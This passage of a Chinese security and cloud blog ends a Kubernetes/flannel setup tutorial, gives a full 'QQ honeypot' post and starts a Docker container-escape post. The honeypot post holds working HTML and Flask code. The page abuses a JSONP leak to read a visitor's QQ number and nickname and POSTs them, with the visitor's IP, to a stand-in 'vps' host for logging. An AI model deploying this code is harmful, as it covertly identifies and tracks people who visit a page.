<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br><span class="line"></span><br><span class="line">kubectl get pods -n kube-system</span><br><span class="line">NAME                          READY   STATUS    RESTARTS   AGE</span><br><span class="line">kube-flannel-ds-amd64-2pc95   1/1     Running   0          72s</span><br></pre></td></tr></table></figure>

<p>kube-flannel.yml(wget的是新版和这个版本namespace不一样，我用的是下面这个)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">apiVersion: policy/v1beta1</span><br><span class="line">kind: PodSecurityPolicy</span><br><span class="line">metadata:</span><br><span class="line">  name: psp.flannel.unprivileged</span><br><span class="line">  annotations:</span><br><span class="line">    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default</span><br><span class="line">    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default</span><br><span class="line">    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default</span><br><span class="line">    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/default</span><br><span class="line">spec:</span><br><span class="line">  privileged: false</span><br><span class="line">  volumes:</span><br><span class="line">    - configMap</span><br><span class="line">    - secret</span><br><span class="line">    - emptyDir</span><br><span class="line">    - hostPath</span><br><span class="line">  allowedHostPaths:</span><br><span class="line">    - pathPrefix: &quot;/etc/cni/net.d&quot;</span><br><span class="line">    - pathPrefix: &quot;/etc/kube-flannel&quot;</span><br><span class="line">    - pathPrefix: &quot;/run/flannel&quot;</span><br><span class="line">  readOnlyRootFilesystem: false</span><br><span class="line">  # Users and groups</span><br><span class="line">  runAsUser:</span><br><span class="line">    rule: RunAsAny</span><br><span class="line">  supplementalGroups:</span><br><span class="line">    rule: RunAsAny</span><br><span class="line">  fsGroup:</span><br><span class="line">    rule: RunAsAny</span><br><span class="line">  # Privilege Escalation</span><br><span class="line">  allowPrivilegeEscalation: false</span><br><span class="line">  defaultAllowPrivilegeEscalation: false</span><br><span class="line">  # Capabilities</span><br><span class="line">  allowedCapabilities: [&#x27;NET_ADMIN&#x27;]</span><br><span class="line">  defaultAddCapabilities: []</span><br><span class="line">  requiredDropCapabilities: []</span><br><span class="line">  # Host namespaces</span><br><span class="line">  hostPID: false</span><br><span class="line">  hostIPC: false</span><br><span class="line">  hostNetwork: true</span><br><span class="line">  hostPorts:</span><br><span class="line">  - min: 0</span><br><span class="line">    max: 65535</span><br><span class="line">  # SELinux</span><br><span class="line">  seLinux:</span><br><span class="line">    # SELinux is unsed in CaaSP</span><br><span class="line">    rule: &#x27;RunAsAny&#x27;</span><br><span class="line">---</span><br><span class="line">kind: ClusterRole</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1beta1</span><br><span class="line">metadata:</span><br><span class="line">  name: flannel</span><br><span class="line">rules:</span><br><span class="line">  - apiGroups: [&#x27;extensions&#x27;]</span><br><span class="line">    resources: [&#x27;podsecuritypolicies&#x27;]</span><br><span class="line">    verbs: [&#x27;use&#x27;]</span><br><span class="line">    resourceNames: [&#x27;psp.flannel.unprivileged&#x27;]</span><br><span class="line">  - apiGroups:</span><br><span class="line">      - &quot;&quot;</span><br><span class="line">    resources:</span><br><span class="line">      - pods</span><br><span class="line">    verbs:</span><br><span class="line">      - get</span><br><span class="line">  - apiGroups:</span><br><span class="line">      - &quot;&quot;</span><br><span class="line">    resources:</span><br><span class="line">      - nodes</span><br><span class="line">    verbs:</span><br><span class="line">      - list</span><br><span class="line">      - watch</span><br><span class="line">  - apiGroups:</span><br><span class="line">      - &quot;&quot;</span><br><span class="line">    resources:</span><br><span class="line">      - nodes/status</span><br><span class="line">    verbs:</span><br><span class="line">      - patch</span><br><span class="line">---</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1beta1</span><br><span class="line">metadata:</span><br><span class="line">  name: flannel</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: flannel</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: flannel</span><br><span class="line">  namespace: kube-system</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: flannel</span><br><span class="line">  namespace: kube-system</span><br><span class="line">---</span><br><span class="line">kind: ConfigMap</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  name: kube-flannel-cfg</span><br><span class="line">  namespace: kube-system</span><br><span class="line">  labels:</span><br><span class="line">    tier: node</span><br><span class="line">    app: flannel</span><br><span class="line">data:</span><br><span class="line">  cni-conf.json: |</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;cniVersion&quot;: &quot;0.2.0&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;cbr0&quot;,</span><br><span class="line">      &quot;plugins&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;type&quot;: &quot;flannel&quot;,</span><br><span class="line">          &quot;delegate&quot;: &#123;</span><br><span class="line">            &quot;hairpinMode&quot;: true,</span><br><span class="line">            &quot;isDefaultGateway&quot;: true</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;type&quot;: &quot;portmap&quot;,</span><br><span class="line">          &quot;capabilities&quot;: &#123;</span><br><span class="line">            &quot;portMappings&quot;: true</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  net-conf.json: |</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Network&quot;: &quot;10.244.0.0/16&quot;,</span><br><span class="line">      &quot;Backend&quot;: &#123;</span><br><span class="line">        &quot;Type&quot;: &quot;vxlan&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: DaemonSet</span><br><span class="line">metadata:</span><br><span class="line">  name: kube-flannel-ds-amd64</span><br><span class="line">  namespace: kube-system</span><br><span class="line">  labels:</span><br><span class="line">    tier: node</span><br><span class="line">    app: flannel</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: flannel</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        tier: node</span><br><span class="line">        app: flannel</span><br><span class="line">    spec:</span><br><span class="line">      affinity:</span><br><span class="line">        nodeAffinity:</span><br><span class="line">          requiredDuringSchedulingIgnoredDuringExecution:</span><br><span class="line">            nodeSelectorTerms:</span><br><span class="line">              - matchExpressions:</span><br><span class="line">                  - key: beta.kubernetes.io/os</span><br><span class="line">                    operator: In</span><br><span class="line">                    values:</span><br><span class="line">                      - linux</span><br><span class="line">                  - key: beta.kubernetes.io/arch</span><br><span class="line">                    operator: In</span><br><span class="line">                    values:</span><br><span class="line">                      - amd64</span><br><span class="line">      hostNetwork: true</span><br><span class="line">      tolerations:</span><br><span class="line">      - operator: Exists</span><br><span class="line">        effect: NoSchedule</span><br><span class="line">      serviceAccountName: flannel</span><br><span class="line">      initContainers:</span><br><span class="line">      - name: install-cni</span><br><span class="line">        image: lizhenliang/flannel:v0.11.0-amd64 </span><br><span class="line">        command:</span><br><span class="line">        - cp</span><br><span class="line">        args:</span><br><span class="line">        - -f</span><br><span class="line">        - /etc/kube-flannel/cni-conf.json</span><br><span class="line">        - /etc/cni/net.d/10-flannel.conflist</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: cni</span><br><span class="line">          mountPath: /etc/cni/net.d</span><br><span class="line">        - name: flannel-cfg</span><br><span class="line">          mountPath: /etc/kube-flannel/</span><br><span class="line">      containers:</span><br><span class="line">      - name: kube-flannel</span><br><span class="line">        image: lizhenliang/flannel:v0.11.0-amd64 </span><br><span class="line">        command:</span><br><span class="line">        - /opt/bin/flanneld</span><br><span class="line">        args:</span><br><span class="line">        - --ip-masq</span><br><span class="line">        - --kube-subnet-mgr</span><br><span class="line">        resources:</span><br><span class="line">          requests:</span><br><span class="line">            cpu: &quot;100m&quot;</span><br><span class="line">            memory: &quot;50Mi&quot;</span><br><span class="line">          limits:</span><br><span class="line">            cpu: &quot;100m&quot;</span><br><span class="line">            memory: &quot;50Mi&quot;</span><br><span class="line">        securityContext:</span><br><span class="line">          privileged: false</span><br><span class="line">          capabilities:</span><br><span class="line">             add: [&quot;NET_ADMIN&quot;]</span><br><span class="line">        env:</span><br><span class="line">        - name: POD_NAME</span><br><span class="line">          valueFrom:</span><br><span class="line">            fieldRef:</span><br><span class="line">              fieldPath: metadata.name</span><br><span class="line">        - name: POD_NAMESPACE</span><br><span class="line">          valueFrom:</span><br><span class="line">            fieldRef:</span><br><span class="line">              fieldPath: metadata.namespace</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: run</span><br><span class="line">          mountPath: /run/flannel</span><br><span class="line">        - name: flannel-cfg</span><br><span class="line">          mountPath: /etc/kube-flannel/</span><br><span class="line">      volumes:</span><br><span class="line">        - name: run</span><br><span class="line">          hostPath:</span><br><span class="line">            path: /run/flannel</span><br><span class="line">        - name: cni</span><br><span class="line">          hostPath:</span><br><span class="line">            path: /etc/cni/net.d</span><br><span class="line">        - name: flannel-cfg</span><br><span class="line">          configMap:</span><br><span class="line">            name: kube-flannel-cfg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230110100258324.png" alt="image-20230110100258324"></p>
<p>看到这几个running就代表网络配好了</p>
<p>kubectl get pods -n cube-system</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230110100424312.png" alt="image-20230110100424312"></p>
<p>继续kubectl get nodes看到所有节点都ready了</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230110100552463.png" alt="image-20230110100552463"></p>
<p>如果上述操作完成后，还存在某个节点处于NotReady状态，可以在Master将该节点删除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete node k8snode1</span><br><span class="line"># 然后到k8snode1节点进行重置</span><br><span class="line"> kubeadm reset</span><br><span class="line"># 重置完后在加入</span><br><span class="line">kubeadm join 192.168.177.130:6443 --token 8j6ui9.gyr4i156u30y80xf     --discovery-token-ca-cert-hash sha256:eda1380256a62d8733f4bddf926f148e57cf9d1a3a58fb45dd6e80768af5a500</span><br></pre></td></tr></table></figure>

<h2 id="测试kubernetes集群"><a href="#测试kubernetes集群" class="headerlink" title="测试kubernetes集群"></a>测试kubernetes集群</h2><p>我们都知道K8S是容器化技术，它可以联网去下载镜像，用容器的方式进行启动</p>
<p>在Kubernetes集群中创建一个pod，验证是否正常运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载nginx 【会联网拉取nginx镜像】</span></span><br><span class="line">kubectl create deployment nginx --image=nginx</span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">kubectl get pod -o wide</span><br></pre></td></tr></table></figure>

<p>如果我们出现Running状态的时候，表示已经成功运行了，可以看到运行在k8snode1节点</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230110100953383.png" alt="image-20230110100953383"></p>
<p>在k8snode1节点使用docker ps可以看到nginx镜像</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230110101052290.png" alt="image-20230110101052290"></p>
<p>下面我们就需要将端口暴露出去，让其它外界能够访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 暴露端口</span></span><br><span class="line">kubectl expose deployment nginx --port=80 --<span class="built_in">type</span>=NodePort</span><br><span class="line"><span class="comment"># 查看一下对外的端口</span></span><br><span class="line">kubectl get pod,svc</span><br></pre></td></tr></table></figure>

<p>能够看到，我们已经成功暴露了 80端口  到 30993上</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230110101156127.png" alt="image-20230110101156127"></p>
<p>我们到我们的宿主机浏览器上，访问如下地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.32.130:30993/ mastter</span><br><span class="line">http://192.168.32.131:30993/ node1</span><br><span class="line">http://192.168.32.132:30993/ node2</span><br></pre></td></tr></table></figure>

<p>发现我们的nginx已经成功启动了，成功搭建了一个单master的k8s集群</p>
<p><img src="/2023/01/10/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8D%95master%E7%9A%84k8s%E9%9B%86%E7%BE%A4/image-20230110101356016.png" alt="image-20230110101356016"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/" rel="tag">云原生</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-利用jsonp漏洞制作QQ蜜罐" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/07/14/%E5%88%A9%E7%94%A8jsonp%E6%BC%8F%E6%B4%9E%E5%88%B6%E4%BD%9CQQ%E8%9C%9C%E7%BD%90/" class="article-date">
  	<time datetime="2022-07-14T07:48:37.000Z" itemprop="datePublished">2022-07-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/07/14/%E5%88%A9%E7%94%A8jsonp%E6%BC%8F%E6%B4%9E%E5%88%B6%E4%BD%9CQQ%E8%9C%9C%E7%BD%90/">
        利用jsonp漏洞制作QQ蜜罐
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="制作思路"><a href="#制作思路" class="headerlink" title="制作思路"></a>制作思路</h2><p>1.获得一个jsonp漏洞</p>
<p>2.当浏览器直接访问jsonp地址的时候可以回显出当前浏览器登录过qq邮箱的qq号和昵称</p>
<p>3.有callback函数可以回调</p>
<h3 id="1-制作一个html"><a href="#1-制作一个html" class="headerlink" title="1.制作一个html"></a>1.制作一个html</h3><p>当页面直接的时候，引入jq用来发送数据，数据使用post数据方式，将jsonp的请求结果发送到服务器</p>
<p>qq.html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;hello&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;load()&quot;&gt;</span><br><span class="line">&lt;script src=&quot;jquery-1.11.1.min.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">function load()</span><br><span class="line">&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line"></span><br><span class="line">url: &quot;http://xxx.qq.com?id=1&amp;callback=jQuery12333&quot;,//这里是jsonp漏洞的地址</span><br><span class="line"></span><br><span class="line">type: &quot;GET&quot;,       //指定GET请求方法</span><br><span class="line"></span><br><span class="line">dataType: &quot;jsonp&quot;, //指定服务器返回的数据类型</span><br><span class="line"></span><br><span class="line">jsonp: &quot;callback&quot;, //指定参数名称</span><br><span class="line"></span><br><span class="line">jsonpCallback: &quot;jQuery12333&quot;,</span><br><span class="line"></span><br><span class="line">success: function (data) &#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">  type: &#x27;POST&#x27;,</span><br><span class="line">  url: &#x27;http://vps:80/balabala&#x27;,</span><br><span class="line">  </span><br><span class="line">  data: data</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-后端解析发送过来的请求"><a href="#2-后端解析发送过来的请求" class="headerlink" title="2.后端解析发送过来的请求"></a>2.后端解析发送过来的请求</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import Flask,request,jsonify,render_template,make_response</span><br><span class="line">import requests,hashlib</span><br><span class="line">from flask_cors import CORS</span><br><span class="line">import json</span><br><span class="line">import sqlite3</span><br><span class="line">import datetime</span><br><span class="line">import logging</span><br><span class="line">import logging.config</span><br><span class="line">import termcolor</span><br><span class="line"></span><br><span class="line">template_folder=&quot;templates&quot;</span><br><span class="line">static_folder=&quot;static&quot;</span><br><span class="line">static_url_path=&quot;&quot;</span><br><span class="line">app =Flask(__name__ ,template_folder=template_folder,static_folder=static_folder,static_url_path=static_url_path)</span><br><span class="line">cors =CORS(app,resource=&#123;r&quot;/*&quot;:&#123;&quot;origins&quot;:&quot;*&quot;&#125;&#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/index&quot;,methods=[&#x27;GET&#x27;])</span><br><span class="line">def dongxing():</span><br><span class="line">    return render_template(&#x27;qq.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/balabala&quot;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def hello_world():</span><br><span class="line">    if request.method==&#x27;POST&#x27;:</span><br><span class="line">        host = str(request.remote_addr)</span><br><span class="line">        timestart = str(datetime.datetime.now().strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;))</span><br><span class="line">        qq=request.form[&#x27;B[data][rankinfo][uin]&#x27;]</span><br><span class="line">        name=request.form[&#x27;C[data][name]&#x27;]</span><br><span class="line">        print(&quot;======================&quot;)</span><br><span class="line">        print(host)</span><br><span class="line">        print(timestart)</span><br><span class="line">        print(qq)</span><br><span class="line">        print(name)</span><br><span class="line">        with open(&#x27;result.txt&#x27;,&#x27;a&#x27;) as f:</span><br><span class="line">            f.write(&quot;======================\n&quot;)</span><br><span class="line">            f.write(host+&quot;\n&quot;)</span><br><span class="line">            f.write(timestart+&quot;\n&quot;)</span><br><span class="line">            f.write(qq+&quot;\n&quot;)</span><br><span class="line">            f.write(name+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">    return &quot;&lt;p&gt;hello world&lt;/p&gt;\n&quot;</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(termcolor.colored(&#x27;Service Start....正在监听当前ip的5000端口&#x27;, &quot;green&quot;))</span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-最终效果"><a href="#3-最终效果" class="headerlink" title="3.最终效果"></a>3.最终效果</h3><p>只要浏览器快速登陆过qq，如qq邮箱，在短时间内获取到qq号和昵称，在长时间内只能获取到qq号，其他漏洞应该原理也是差不多的，只要收集足够多的jsonp漏洞就可以溯源了~</p>
<p><img src="/2022/07/14/%E5%88%A9%E7%94%A8jsonp%E6%BC%8F%E6%B4%9E%E5%88%B6%E4%BD%9CQQ%E8%9C%9C%E7%BD%90/image-20220714160001691.png" alt="image-20220714160001691"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" rel="tag">安全开发</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Docker容器逃逸方式总结" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="article-date">
  	<time datetime="2022-06-14T11:03:28.000Z" itemprop="datePublished">2022-06-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">
        Docker容器逃逸方式总结
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Docker-Daemon-Api未授权访问"><a href="#Docker-Daemon-Api未授权访问" class="headerlink" title="Docker Daemon Api未授权访问"></a>Docker Daemon Api未授权访问</h2><p>本地环境：</p>
